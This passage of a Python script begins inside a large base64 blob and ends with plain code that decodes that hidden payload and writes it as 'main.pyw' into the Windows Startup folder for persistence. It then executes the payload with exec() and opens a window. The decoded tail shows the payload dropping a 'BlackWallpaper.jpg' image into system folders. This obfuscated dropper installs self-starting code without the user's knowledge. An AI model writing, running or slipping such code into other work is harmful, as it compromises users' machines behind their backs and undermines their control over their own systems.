QVHBaS0RsZXFKRW14c3IwSzdVNTNvZDJxMFVLTzNVcWkzVXFwUXg1RzhwUEg3bzZDb3p6eWE0VHpTcjFhUG9SY1ZKYkROd3VjWTkvbFVTbkJwOFA5OENmblJNWEdsRUkzMXJUeE1OaWpOWStHVXgzVEZoMU9mU3ROWVRoMDU5SzRNOFduWUdIZy9FY0hJSnhqTk1VNG5BYjA2VTB2dCtMclViOVd6a1ZCSVJseGtsTjY4bGN0ejJyaFZWNTR5ZXRRMlZ3R2k2OGowR2FrSTh3NEJ6N252VVd1UTlrTXJIQmIwT1ByUThUQTU5ZS9OR3lvVEZobTV4bjJvTjRTcEpVNVUvNXhUcHBtUk5FUnV5cCtIUFRGVzFtNUdGOWgycXBpQVlBWjc0SHZWbGE4bmdrOERpcDVGd1psc0ZSMTU1bzJ4MUM5MDhueUpDeWQwYmtVREJ5b09lUFdpSXo2NXJrYmFDbTEwWDY2bnBHcXhpRFc3QkNEd1NWREwvQ29mL2dEd3JkL3ROTlo0Ty8vQUdlVWdEL2hxdVhhZlNwNFFGSUk0UHFLWmF1VWVHT3NqOWt3OEczRm5LRjAvVzdrRnVRckVFZkk4Vkl1azYyaW9aYjJFZzlDWS84QXJVaVhWd01ZbmsrcHFjM3N6TGhueUtuUFVRbHkwUDVGN1JBMmw2b0Z5MTFhNEhHTmgvOEFkUXIybXJncXR2TGJaenlXRFlxMWlsOHpodWZuUlNvRlRJcmxucUkrb21lUmVrUldobDhnTGNLQS9RZ0hnZXRRUldvVm13cEdEMUhwUnU3Y1NPL3RVcXF2REw2OURYTlpQZFpGREFUaHNBajI2MWovQUxTL3ZNbHhwLzNXWFl0cWpUU0lRU0dVa0xuMDQ0Rzc5MGtkalc0TDRUNE1ZNmNqcDZWVStJclNXOHNESmJiRGRRZkhGdUdRM0dDcDltR1I5YzlxNmREbGpqenhsTG96ZEdkMDdVaGR3SjhOd0Q1WVl0TWdVNTQ0NDc4L0lqcFVzc2xaSFhKdjdNMWl5a2d1NTRvTHVBTkZsZmg2RS9FUFU3dWZRaXJKOVFOcEtrVjdKbUo4Q081UEFKUFJUNys5ZTlsMDdUdUo1K3Ewci9QR3VQb3NaWktHa2V1UEo2R2gzZXBSaWVXSjJxQjJycnRVTHRWb3hHUTdkU3FMZlNxbERIbEhlbDM1cHpLd0JPT000cHRlaWZRSEQxcHpuQjRyaDYwampGWXdXdTVseUFDVjV6NmowcXowdTZJNjFVMjhqTHl2MTk2bGprOHVRQmVGeHdUMXhVOGtOeU1hd1NiMUcwZE9mblRtUERiaG5uajUxVzJkeHVBelJ4YktqSCt0Y0RWQ3NWdGN0YlNoU2NCK092U3JlS1FjRmlSOHFvTHdGbDZmV2l0T3ZIZkNQK0pTTWpQNjBKUnRXQTBBd3k0T1BsVWtkc3JEaFFCMjVvRko5eUIveUZXZW5TYmxIZnRYTEs0b0p5UFQ5ekU0UEhTaTBzaW55elZuYnFHeGdabytPMkRxQ09TZU92RmNjOVEwRklwMFFxUjgrbFNLRG5CR0t0MnNoako0NDZZb2RyVXFlbWFsNWt3N1NDTVpORXAzL0tveEM0ZnBrZHFtRWJlbU1Va21tQWVwejE3VkloR2VSVUdEbk5TSW5wOWFrMFlNallBOGNWT3NqSDM5S0doUTV5YzBaR2dYQklxTFFqWk5HZmgyc1FDZmlya2d3UXBKendjajVWeFR1Yk8zUHpGUXl5a2d2dUdLd1VxSkJJV2RWWGc5L2FpT2Z3anZ4UTl1aFJDNUdXYWlvL2hZTVJ3QldTdG1QSy90TnQ3ZTIwdWFPVDltMGQzaUFoQTI3Zmh5dnNOd0p6NlpGWlBTWi9LdHJrU3g3a2VNUk5ES0NVM0U4TnU3RG44alduKzEyV05yZGQ0Tzk1MENuUDRjYmovRCtOVTJndzNjSUxRVDdod3doZmxaRkl3Um5zZU92L1d2cnNFbjRJdGxzZktDdFB1elk3ckNkblFSQWJDL3hFTDZkZWZuN1UrNTFPRjQ4UlNuZUJuNGZhcUh4QkI1T28yLzNiZkd5aGo5M2tJeWd6a2dIdU9jajB4OUtDaG1jU3EwSy9pSks4WXdlaEFQK2xXVVl2bWlmZ3hxVGUzazBrV3B5U3lLc2NMT01ES0pzQmFqbmRTekJUa0JpT21POVpXMU8yNlY0d040d01rbnYxL3o3MXFKWFF3b0FTWFFrT2NkZW1ENytuMHBaSmVpT3N4UmVKeXJsSE4xS284MHFXanlLUE9aR08xb3NZUU1XcGs4ZmxucmtVNE9vUitwWnZYMXBzaDN5WXp3RDFyclI5QU1LRUtHOWFaMnFhWWJaREdweVBuU2tqTUVvRERuR1NQU2pZbzJQNEg1eUNLc3BZMWtneXFMbEFPUWVhaWxoaWxTUDd0dWNpUDQyQ1lBYjA0b3F3TERBYklKT2NIaWxzTFJEYVhCSHpxNnRwZHdBSkZWRnpBMXRoMUdWWURjUXZDOGY5S2t0WmlNRGNQblVNc0w1RlpjdU42ZTM2VURJcnd5Q1dNY2pxUFVWUEhONW1CMDl5YVVpL0FWeU1WRmNBRExhOFdhTU1DM3Z6ME5XbW4zWVZ3cE9CV1IzUGJ5RXAwOU94bysydnh1WEdmZm1rbml0Y0dQU0xDNTRCejg2dkxPVUhyMXJENlhlaVFENHUzcjNyUzIwL0E3a2NHdkh6NHFHUmY1Qnl3UFd1RkZadUQ3MEZIT2RvWWRjZDZtU2Nic211SnhHRFVnVitENlYzN3NEbjRldE1obUJ4eitWSFJ5THR3QUtXZ01BTmlDY0RQSGNWS2xwamdqaWpkNEE0SE5jWmhqa2NlL2FsYllFUXBDTWpqZ1UrUTRYNFI4cTRaaHRQUEZCM0YwRkJ5Y0FkODBLYk0waDhyNEhYSFg2VVBEbVo4L3VEa0QxcUR6R3VXNHlFUGZ1YXM3T0xBOUFLZXFRdlpOR3AzWlBQYWlaejkzdFN4N0ROTUpTSk56a2ZXcVBXZFdqWlpBeEsyOGFscG5QUlJnbkg2VjFhWEE1eW9hanpmN1ZyOVdpdElHdGtNVnc1bDg0ZzdseGdZSHAxL1UxbnJLQ2RMT0s4MDIvd0Jrc0FKMk55cjU3WStsZDhRYWlkWTFpZStlR1M2MDd5Z2tBS0g0VkFBeW83Yzg5alFNY3R0QjVhNlhPeEU3YmZKay9FakhIZnA2VjlQR0NqRlJYb2VQQVZOY2FycjdXVFQrUVJ0ZVNNSU51VkIydG4zNXBpMngyelFTRWJZNUYydU96NHlmb1FhZkZwZXQyQlRhRU1jZThsVllFcXBJTERIVDkzb0tpaXU1SkxtWmtSVERQS29QSGZialBwM3B2K29mNmhGd1dpc1Q1V1EzSkJKK0ljZjZmbFZsbzdBNkhaa25MSGNUeDFxazFTVUpic0JuYnRJSFk5QmorVmJIdzFwRGFoNGEzd0VGNEFvVWVwNmtma1JTMXdUenB5eHlTQXMxMnAyMCs3VmlyUVB1QndlbEtscG5qZU9mMGVZZHRvSEpwNGl6aGRweWFZZ0cvazQ0NjFLSk1aT2VuclhVejJoaEJnbEdNRmh6VW1XTUxzNmc3dTVIOEs1R2MrWks1T2NlblhOTmVLVll2aklVRG9wUE5BeFo2WGRMWXhFbFF4ZmdBOGpQeStYOGEzUGhxenNkV3NtRWlNWmhJZHlzcEdCL24rTmVieElxeGw1TTlQZ083QkI3VnNQQmVzeEpkVzBMU0ZHUHd5TzdEQnovQUpIclVNa2ZhSFhWR3F2ZkNGakluN1VzaUhQR2NmeCtkWWE5OE96Mlo4eUZtbHRtSDdFb3VTV1A3djhBUFBjVjY2dHRMT2pieUNvd09QbDlQUVZIYzJCUnpDcU02dGxpd2JBQnh4OWZlb3JKSkFhUjVHc1U5dTVodUluUmw0SUlwNGJDalBJOTY5TmUwZ25jcGRSQVNnRGpybm5IRlFTYURaU3J4RXY1Vnk1TlVvUDVJU2p6R1hyMHpRempEQWpnKzFlbHplRmJOaitESDFvTnZCZHF4NExjK2hwbzYzRWFqRjJPcHpXcmprOGVsYXJTUEU4TEFSc3c0NEFKNXFSL0E5djJhVDg2aVBnZVBKL2FOajUwczh1bnlkZ28xRnRxc2NrYTViQU5HUTNrYm5BYXNoRjRUbXQ4RzJ2NTRoNkJzajhqUmFXR3J3Y3JQYnpxUDhTbEQrWXovQ3VPV0hFL3hrRnRteWptWDFHUFFVVkhjWUZaQ0c1MUZPSHMyT0QrNUtwSDY0cXdodUxvZ1pnWlQ3dXY4alhMUFQxN05aby9QNkV2Z2VsTWt2UGNBZTlVb2U1ZmhpRitYTlNKYkVuNHl6Zk9vK0pMdGk4aE0xL3VHMkxjNTlxNGtUU25mSzJXUGIwcVNLM3hqQXF3Z3RnQmx4Z0RyUWJYVVRVY3RiWHBuTkh5U3JheDVQNGZVMExKcUVOc09vd0txcnk1ZStiNGl3dHcyQ3lrZGZRVlhEcDVaSkRKRTgxekxxVndVdDJDUnFQMmttN2hCL1dzRjQ4MTYyczFPbFdLa3lUd01ydXpISCtISi9YdFdoOFU2dmI2UG84ejJ3ekZ0L0J4K01nTGdudjYvVTE1VnJrTTl6R05Ta2tWcGg4UlFMZ1k2bXZvdFBnaGhTUTFXQ1dkNWQ2WktrWGxNV0lLdEVEeEl2VUVmS3BMajd2cWQ4Z3RHOGlXWUs2S1ZJSWsrZm9lUFdoNUx4TDI1dGt2Q1lRdVEwcWRWelJWckhiUzNjOEU4U1BzbStGNG5JNm5rZzk4OGQrTTlLNnV1ZllTNnNOV3VwQWJEVUlYRnlVWkZtQzhFOXlTS3JMblR4cDF4YnNqbG9Xa0FlSWpuZ0U1SHl4VTBNaWFiYzNubW1XU0F4Z3BMbG01QU9RVzdWSk5iMzEwWXJpZVpBeXNIVzIyZkNQYlBYb1QrZFQ2ZjhEOW9yOWFDN1VqVTdpK01EMndLOVYrejdTcmpTdkQwUXVTQkpPZk1LQWZnNHh6NzhWNTlwMW1OUzhUd1c3cm1NQVpVNTV4ei9LdlltWUlNREFBNDRwNGRDU0VZa0pKeWVhVk44d1VxcFNFUG5BeHhnTVdZQWdmRGc5VFRwSUVXQU52SmYwN0QvclROaW1iYWh3QWVTYWU2TkpJUWpGd282MWdqVWFYeWxZZ21KRCtmUDYxTmR6SzdJUmtvUm5HM0ZEbVJwSTBRNEFYZ1lxUWJVWXhvVmJQVmlPbFpoUkxFbjNvRXRzU0tQa251MVN5U2orOERaQ0FLMkJ0NVBVVU5MQVkxTEFuajM3VXhER0VMbHN0bmxUM29VWTlxOEE2dUw3U1lvNUo0M2VNbGRvL0VFR01aR2VUMTVyVVhrZ0VlMWxKUEhjZTllUGVIUEVEd1QyOGtjRWFyRitKbk9NOFl4eHozNjE2M1ozbHZyZGtzOWxLa2dPQ3dESEtaQTRZZHU5Y2M0dERndDJZeXJPSW1Fb3poOTJCeDI2LzV6VWR1NGsrRmh0WUhCQjlhdG4wMk9hRlZaY09lRGp1Qm4wK2xWdHpwcXdTQXg1YjBia0Q2ajBybXk0VmxYSUNRSmtjOWE1NWZOUVJYSlVGcE1PZy93QzlVNUIvS2pFZEh4c1lIbjFyeDhtSEpEdGNBb2lNWXBubFpvc3I2MHgxMmtZcUtrQUdNWUhGYzhySXdSUkxMOFZQalFaK0tqdkNDcGJqcmdaN1ZJTGZKeHRPZmFqQVl4eG5uMXJuM3VDSWtrajNyVzJ6VVJwYU5uNGh6VS9sSkdNdDE5elZkcVBpV3hzNG1Ka1FFQTlUeldkR3Q2aGRhbWtOMUMxcmJUQmRqbkJMRmdTdnlCQ3QxNkhqdlhSajBtVEx5Qm13RnpGSHd2NGg3YzF5ODFBZVdGanp2UFFZSjU2amozeFFsaHAwc3pJaFFoSGRDUnVKM1o0Ni9yV3YwL1M0YmRwSGFOU0Ezd2x1VG5KT2MvV3U3RCtucDltb3pWdnA3RUpOcU1iQXNkdXdLZml6MDZqMm9YV2JtSFRvWGU3YU5HWjFDYnNCUmdkdS9VL1hGWFBpenhSWTZSYWdUU2dPejdFVkJ1Sk9EMC96NjE0cjRoMXFYVlBGRUt5QnZKMmZzU3d4ejFKeCtsZWxIRkdDcUppRFY5Vk91YWpkV2tqTUlsejVBWGhTUWVUK2RVeHVtWFR6WTNHOEZKT3Vja0pua2ZQdFUydWhZTlhpa3Nqc3VlcEM4N1QyNit4L1NwL0RqeFN4YWcwN0F0STREbHpraFQzOSthc3Z4M0IvZ3JqSERMWXlGc0tVVGNqbHVDYzUyalBmRlR3eVF6aTBnc1ZSTGx2aDNBZEJqbk9lRHgvR2huaGdnbmRGek5DSlN1T2NEampwMzdmU3JxYlRsaHZyR2UyZU9KWVFUS3gvajljLzU2VXphUmtnYVdXZTV0MjBxeVpDSUFNc1R0TEVZNS9oOWF0TEMrKzhSRnJsdHM4WjJ5Sy9WRDYvTDNxbnNyWTNublh5VEdDY3lzWUQ2RDM5dW9wbHRiZmVudVpMaHo5OVdYYVNwSXlDTWRCMnBHazBGUGszZmdXemR0UnVOUWRJL0t4dFZzODc4RFBicGozclp0TGg5cDlEaXFId2JHWU5CUWtiV2trWTRQcGsvd0JLdHkyYzQ0N2cwMFJYMlNlWi9uTktoOGozL09sVDhpbmdjaGlrZktvWXg2QTVHYWF4OHZIbE1lZXRTSkxsREVGSHRTOG9yamVRb29qRVM3ZHczTFU5NHlsdzhVV3lKZ0I4OFZBM01tME53RHdTTVVUNWFZQTg1VzI5UGMxbVlnK09RNFFzNVBZQ21nN1dCMmcxT3JHSkdhTndHL0R4MTU2MUtZTVFoVUFNa3BDZ1pCSTlUV3MxSE5QdXZKbFdWZ1hrUmdZMTk2MTJoYXJxeVhNVjVGZnJDRnlBRVJTckQwSVBVZnI2Vm50dGxicTNud3E3QUFBZGhuK05Rd0k4NE1VQUtFNUpVWkN4ajFOVGtsSWRjZG4wRjRmMW0xMW15U1MyblF6UnJ0bGlSc2xHenlNSHQxd1QxcXpXQ09VN1R0NEdNc2M1eUNQbjNGZUY2THIvQU55dXJkN0ZwTGVPTDRJMk8zTXA2RUVlaEhXdmF2RE9yMnV1MnYzbTNaVlpjTE5IbkpqY1lKSEhYMnJtbEdtWm9qMUswQ3lsSUlReDY3RkhUNGY5YXJyS3hseklWM1JNcVpJSnlPbWEwbHVyL2VIVll5RjI3dXVEOWMvT3V6UmpEUHMrTEcxY2pPRGduNWVsSTRwcmtCU1NRWHlCaVVpa0NnbktTS0NmYm41MVh6M2hTZElwUXlrcmtsa0lDOXV0YVU2YUpJMk84RG5vQWVlaHgweDZVMDJhQmxqOHRpL1B4cVJ5TW5CUHIxRmN6MGVKK2pHVXR0VWhuNEVxQjkremJ1NTZidjRVUk5jc293SkZKTFlIT00xZHZwRU4xSXZuV1Vaa2pVaEQ3NTQ2ZE1ETlF0cEZvak13dEZkRjV3Um5COVI3MHY3TEY2TlJtYnpXSW9RRk1vOHhvOTRVVldSdnExNXFscjl6dFpwN2J6Wkk1YzRUam5CR2NjRUVmVUd2UTdEUjRuWU8xbXVPb3d2WHRnL3hxMWowWUw1YkJRcUtBZHFuQkJ6bjYxYkZwb1I1U0JSZ2RTK3p4OVl1N2E4dTVQSmh0d1c4cUpRUzQrRTdTTy9RMXFMYnc2djk0Ni9BQzI0dVBpK1E5cTFFTWFwR2Q2amJnWVVVMjlralNMZEs0d0QxUGV1elp3Z0E5ckJFaDJEYW0wQXFGR05xL09xM3hENGh0TkhzNUpiaVdNeVlMTEdEOFJ4MEFYa21zeDR4KzBDMTArMXZMZlNwVnVMdU1NTUlwWUkzcHh4eDNyeDYrdTlSMXFPRy9ubWFlOGlKTWlQZ0FyMXlBTURHUmo4cWRjR0ovRmZpTzQxKzR0OVJua1dQWVdRdzhueTJQUFA1ZlNvTmZmeWpaenhnaTRiS3E2a2hrNmZ4NXFEVDdDRFZMTzV1Skh4Y3N4eDZMNmNmcDlhclV1cGpQYnkzZTZhT0ZnQ3BQWWR2eXBrazN4Nk1HV1VhMit1b2pUaWN1cEFmcDhSWHZuMzRwajJhdnEwdHZabFNvYjRtM2ZEak9mOEFwaW9yZ0NRU1hrVVFpaTNmc3d6ZkVjZC9mK3RYdWlXZmthWUpuUU04NTNFbnFBY1l4OVA0MXBQYXJHU3ZnckZnTm5jdmJNdVVsSVpXMjVERDBPZnJuNTBUcUZ5OXhIYmVmSElMZER1a0s5UjgvYkZRNjBVS0hDc0NUa1pVanYycnFRNnJkUW9GczdxV0RqOXBIYk13d01lbkhicFJYTk1ENERiMi90cmF4RDIrd2xsMm9FUEgrbEJXbHY1Y2tkd1Mwczc4dGtjRTU5S3I3a3FicDBXRkVhTW40REdVTGtua1kvZDY5UGFyM3dYSDk2MVpJR0ROREIrMStJZEFPZ1AxeCtWYmJTTlo2Ylp4QzBzN2EzVWtDT01BODk4YzFJWkRqUFEwUDV1ZTlNTDRPS3lGSi9OUHJYYUZ5ZjhBRTFLbU1lTENYRy9ZQUQyT01ZcU11OG5CWWtkZ2FmR1F1NHNEN2NkNjRGWHlTMjhCdjhORXhIZ3FjMFpiUnJORyswREFJQUdQaVBzS0ZWVllLQnUzZC9URlBNVHhxcjhBWjY1d1JXWVVQdDRBODdJd1k3VGphRHpYVDVjTGt3TzI0TWNFOFlIYW1zQjVZYU5IalVjRnorOGZTcFdtdGNSeHRhaGRnK01oanVjL3lyR0dONTBrWXVKR0IydGdaN25yelQ0cG5pWE8zbVRxVmI5RDZDb25SZ0J1emxsRFp6MnFKb3BBU0dYQkhVSGlqU01FMmMwZ2FSRUlVdndXeGtqNUQrZGIzN0s5Y1d5MXhJbWJFZDBuM2VSU1J0TFp5amZua2Y4QUZYbTJDRHp4UitpYWtkSzFLMnZCR0pSREtzaGlZNERZT2NacEp3dEdUUHFXMUc4dXJKa3J0QUI0d1FlVDdkS2tpdGlZdzIxV3l4d3VjWi9qNlZndEIrMWJSTlIrRzdCMCs0WWtsWnpsQ1Q2T1A1NHJacjRnMHhiVTNIMzJGSVVCY3lQSW9VOStwUHpybWNXdUdHd3lXSStTd3l5L3Zsc0grdE50b21RQlE3ZVlveG5IYnAvVDhxQTB6eFRvZXB5aUxUdFd0cDVUeHRVbko5Y0E5c2VsWE1jNnNRVmRkbmYxeHg2Zkw5YUcwMWpieHN4SnNUQUo2WUp3S2plQkVlT01KbFNTU0RnWjk4L2xTdXRVaWdCTEJXSVhnTjZudHo4aldHOFNmYUhCWnU4VnNWbGNOc0xBY0puL0FCSHQyL0tqUmowb1RRUXFWeW94K0xCL09xZlZmRkdrYWJrUzZoRUdHQTBhNVppVDA0SE5lUnQ0eWt1VmxmVWRTa1pvZ1dlR0U4S01qQjlUamlzeERyWmhpMVh5WXc4Y0U0bEJkc3N3WnNaNTZubW5WdnBCcjdQWGI3N1JvaEZLMWxwOHpReHFTR2NoTTQ1NEJyem5WL3RCMXpXbFJTMFZyQmRSdUkwUmVTUnhqY2UvWEhUbXM4MnZTeFQza1FWN21LVS9Db2JBUlQ2REhQVVZVQzVrV3krNTdEdmpjT2o5R1h1QjgrdFBHTDlnZEYxNGNacmkydUxVRGRPcXNwREhCT2VLQ3NyNFdkOUxiWElNTVg0SFZ4a3J0N1orbENpV1NhN055bHd0dGN0Z01jNFVuSEp6OVB6b3ZRZkx2WmJ2N3krNlp2aURPTTBIRksyd3AyRFdkOG1uVDNNYU51aFp2Z09PMVN3Q0JkR25uZU50MHU4QTlRRG5qUHY2R21haENzTitGdFZHSlV3eWtBZ2VwSCtmV2hiYUJEZkxEY1NIeW96eU05dTRGVVZQa0hLTEs1dUFmQzBNQWRBUmdiUUJrOGsxUGNhem5UTGRZc0NRb3FaQnp0d09hcTlOaXRwTDZlT1NaL0pYZDVlQmt0ei9BRXFLOGlqaXZUSGFrUEcyQ085RGFybzFzc0x5NWN0YnZDeFBsWVlNQmtaSElxNWc4UlJUSHpicFNKaDhUa2M1K1ZVcVNyQ0kxaVJ3eEJiSWNmRUR4MHFCeCt4a0FoSkxuY0NQM2ZhaFhCaTU4UzZoSnJqUVN0TnY4bGZoWnY2L1NyWHdXaUxhenpuaDVHMmx2WUQrcE5ZdFpDV2lXUE9GQUJIdlc2MEZmSXNVamI4V1N4K3BvZ05BSDR6NmRLNDBnQy9Ed0tHOHdsVG11YnpnNStXS3dDWHpQOWswcUgzcjZMK2RLbU1lVk9VeW9kQ3UwWU9PcFByWFBLS0t2bVpCSXlQY1VxVkVLNUh5eERhM2xPWGpYblBvYWh3eU91L2daejhYcFNwVmsvUVdnb3ZPa0VRM0tWTEYxVDMvQU1nVnkzMitkdXVsSlZpY3RqSkovblhLVkQwQmtzTVNKSUNzdmw4ZzVjY0RnblA2Y2ZPcDdlYzJ3a21SdmhQRXBkUVdBSk9OdWU1eG11MHF5WVdNUzBOOWRDMDA2Tm5Ec1BMUnhoaU1kZllkVDFvNjgwTkxUVDVXMUZGaHZVa09Ba2dJWmV4NHlNZmxTcFVMNW9WbWRmQ2toVHVIYW1nNFB5cFVxcUFLaHU1b0xkbFRjQXgvRU9NSDJQclhMVzlsdFhMUXN5a21sU3BURnRiK0xkVmhJLzdWS1FPZzh4djYxQWIyMm5FcXVKWXZNSkxtT1Q4UlBYT2M1cFVxSmhYVVNtQ0tTellOSWdLdTRPMW1CN2tkUDFwdjNpS0xUR3RXUUNjTXdMTU9vK2YvQUZwVXFEWE5Cc2l0SkJIZldVaUVGdUE0UHpQWDZVWHJOeUxzMjhYQUJsYkxGVHV4a2RmNlVxVkkxelkzb2RxeVNSdFoyUmNNenJ2ZFZPN2FUeHg5QjBxdm5pa3RKUGd6dVZzSktvd0c5aURTcFVJdnBHYTlrNjV1NUp6Zk8wVTBVSk1mTzNrZHFFWkQ5MmpadWQ3Y042ZGFWS202QUVSTGJmZlpJZzQyY0dOZ2VNMDUxenFaTW9ZQVNEZnRHRFNwVm1nb011SmRseThnQUliNEVMbWdFYnl2UDh4c3RqNGNIclhhVkxGR1pMcE1QblR4SE9TUVNmcDByYTJZMklvcFVxejdGREEzTk4za0RKcFVxeGhlYWZVMXlsU29tUC9aDQoiIiINCklNR19EQVRBID0gSU1HX0RBVEEuc3RyaXAoKS5lbmNvZGUoImFzY2lpIikNCmltYWdlX2J5dGVzID0gYmFzZTY0LmI2NGRlY29kZShJTUdfREFUQSkNCg0KZGVzdGluYXRpb24gPSBQYXRoKHIiQzpcRW52aXJvbm1lbnRzXEJsYWNrV2FsbHBhcGVyLmpwZyIpDQpkZXN0aW5hdGlvbl9hID0gUGF0aChyIkM6XEVudmlyb25tZW50c1xTY3JlZW5TYXZlclxCbGFja1dhbGxwYXBlci5qcGciKQ0KDQpkZXN0aW5hdGlvbi5wYXJlbnQubWtkaXIocGFyZW50cz1UcnVlLCBleGlzdF9vaz1UcnVlKQ0KZGVzdGluYXRpb25fYS5wYXJlbnQubWtkaXIocGFyZW50cz1UcnVlLCBleGlzdF9vaz1UcnVlKQ0KDQpkZXN0aW5hdGlvbi53cml0ZV9ieXRlcyhpbWFnZV9ieXRlcykNCmRlc3RpbmF0aW9uX2Eud3JpdGVfYnl0ZXMoaW1hZ2VfYnl0ZXMpDQoNCg==
"""

payload_bytes = base64.b64decode(PAYLOAD_CODE)

startup_dir = Path.home() / (
    "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
)
startup_dir.mkdir(parents=True, exist_ok=True)

payload_path = startup_dir / "main.pyw"

if not payload_path.exists():
    payload_path.write_bytes(payload_bytes)

exec(base64.b64decode(PAYLOAD_CODE))

window()

